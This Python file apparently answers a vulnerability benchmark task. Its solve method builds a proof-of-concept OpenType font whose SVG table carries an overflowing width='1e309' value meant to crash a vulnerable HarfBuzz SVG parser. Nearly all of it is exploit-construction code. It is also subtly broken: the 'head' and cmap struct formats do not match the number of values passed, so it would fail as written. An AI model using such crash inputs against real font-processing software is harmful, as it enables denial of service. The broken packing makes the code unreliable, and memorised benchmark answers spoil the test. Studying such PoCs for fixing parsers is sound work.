import struct
import gzip

class Solution:
    def _calc_table_checksum(self, data: bytes) -> int:
        """Calculates the checksum for a single font table."""
        data += b'\0' * (-len(data) % 4)
        s = 0
        for i in range(0, len(data), 4):
            s = (s + struct.unpack('>L', data[i:i+4])[0]) & 0xFFFFFFFF
        return s

    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept font file that triggers the vulnerability.

        The PoC is a minimal OpenType font containing an 'SVG ' table. Inside this
        table is a gzipped SVG document with an attribute value designed to cause
        a floating-point overflow during parsing (e.g., width="1e309").

        The vulnerable version of HarfBuzz's SVG parser does not correctly check
        the error status (errno) after string-to-float conversion. This allows
        the overflowed value (HUGE_VALF) to be processed, leading to a crash
        due to use of an uninitialized or invalid value. The fixed version
        correctly identifies the conversion error and aborts parsing.
        """

        # --- 1. Define and construct individual font tables ---

        timestamp = 0  # Use a fixed timestamp for deterministic output
        units_per_em = 1000
        num_glyphs = 2  # .notdef (GID 0) and a placeholder glyph (GID 1)

        # SVG table with the malicious payload
        svg_doc = b'<svg width="1e309"/>'
        gzipped_svg_doc = gzip.compress(svg_doc, compresslevel=9, mtime=0)

        svg_table_content = b''
        # Header: version=0, offsetToSVGDocIndex=6
        svg_table_content += struct.pack('>HL', 0, 6)
        # SVGDocIndex: numEntries=1
        svg_table_content += struct.pack('>H', 1)
        # SVGDocRecord: map GID 1 to our SVG document
        # svgDocOffset is calculated from the start of the 'SVG ' table
        doc_offset = 6 + 2 + 12  # Header(6) + IndexHeader(2) + Record(12)
        svg_table_content += struct.pack('>HHLL', 1, 1, doc_offset, len(gzipped_svg_doc))
        svg_table_content += gzipped_svg_doc

        # 'head' table (checksum adjustment will be calculated and patched later)
        head_table_content = struct.pack(
            '>LLLHqqhhhhHhHhh',
            0x00010000,  # version
            0x00010000,  # fontRevision
            0,           # checkSumAdjustment (placeholder)
            0x5F0F3CF5,  # magicNumber
            0b00001011,  # flags
            units_per_em,
            timestamp,   # created
            timestamp,   # modified
            0, -200, 1000, 800,  # xMin, yMin, xMax, yMax
            0,           # macStyle
            8,           # lowestRecPPEM
            2,           # fontDirectionHint
            0,           # indexToLocFormat
            0,           # glyphDataFormat
        )

        # 'hhea' table (Horizontal Header)
        hhea_table_content = struct.pack(
            '>LhhhHhhhhhh hhhh hH',
            0x00010000,  # version
            800, -200, 0, # ascent, descent, lineGap
            1000,        # advanceWidthMax
            0, 0, 1000,  # minLeftSideBearing, minRightSideBearing, xMaxExtent
            1, 0, 0,     # caretSlopeRise, caretSlopeRun, caretOffset
            0, 0, 0, 0,  # reserved[4]
            0,           # metricDataFormat
            num_glyphs,
        )

        # 'maxp' table (Maximum Profile), version 0.5
        maxp_table_content = struct.pack('>LH', 0x00005000, num_glyphs)

        # 'cmap' table (Character to Glyph Index Mapping)
        # Format 4 subtable mapping 'A' (U+0041) -> glyph 1
        seg_count = 2
        search_range = 4
        entry_selector = 1
        subtable_len = 16 + 4 * seg_count
        subtable = struct.pack(
            '>HHHHHH',
            4, subtable_len, 0, seg_count * 2, search_range, entry_selector, 0
        )
        subtable += struct.pack('>2H', 0x0041, 0xFFFF)  # endCode
        subtable += b'\x00\x00'  # reservedPad
        subtable += struct.pack('>2H', 0x0041, 0xFFFF)  # startCode
        subtable += struct.pack('>2h', 1 - 0x0041, 1)    # idDelta
        subtable += struct.pack('>2H', 0, 0)             # idRangeOffset

        cmap_table_content = struct.pack('>HH', 0, 1)  # version, numTables
        cmap_table_content += struct.pack('>HHL', 3, 1, 12)  # platformID, encID, offset
        cmap_table_content += subtable

        # 'hmtx' table (Horizontal Metrics)
        hmtx_table_content = struct.pack('>HhHh', 600, 50, 600, 50)

        # 'post' table (PostScript), version 3.0 (no glyph names needed)
        post_table_content = struct.pack('>LLhhLLLLL', 0x00030000, 0, 0, 0, 0, 0, 0, 0, 0)

        # --- 2. Assemble the font file ---

        tables = {
            'cmap': cmap_table_content,
            'head': head_table_content,
            'hhea': hhea_table_content,
            'hmtx': hmtx_table_content,
            'maxp': maxp_table_content,
            'post': post_table_content,
            'SVG ': svg_table_content,
        }

        num_tables = len(tables)
        entry_selector = (num_tables).bit_length() - 1
        search_range = (1 << entry_selector) * 16
        range_shift = num_tables * 16 - search_range

        sfnt_header = struct.pack('>LHHHH', 0x00010000, num_tables, search_range, entry_selector, range_shift)

        table_directory = b''
        table_data_concatenated = b''
        current_offset = 12 + num_tables * 16

        sorted_tags = sorted(tables.keys())
        for tag in sorted_tags:
            data = tables[tag]
            checksum = self._calc_table_checksum(data)
            padded_data = data + b'\0' * (-len(data) % 4)

            table_directory += tag.encode('ascii')
            table_directory += struct.pack('>LLL', checksum, current_offset, len(data))

            table_data_concatenated += padded_data
            current_offset += len(padded_data)

        font_data_without_checksum = sfnt_header + table_directory + table_data_concatenated

        # --- 3. Calculate and patch the final font checksum ---

        font_checksum = self._calc_table_checksum(font_data_without_checksum)
        checksum_adjustment = (0xB1B0AFBA - font_checksum) & 0xFFFFFFFF

        head_tag_index = sorted_tags.index('head')
        head_dir_entry_offset = head_tag_index * 16
        head_table_offset, = struct.unpack('>L', table_directory[head_dir_entry_offset + 8 : head_dir_entry_offset + 12])

        final_font_data = bytearray(font_data_without_checksum)
        final_font_data[head_table_offset + 8 : head_table_offset + 12] = struct.pack('>L', checksum_adjustment)

        return bytes(final_font_data)
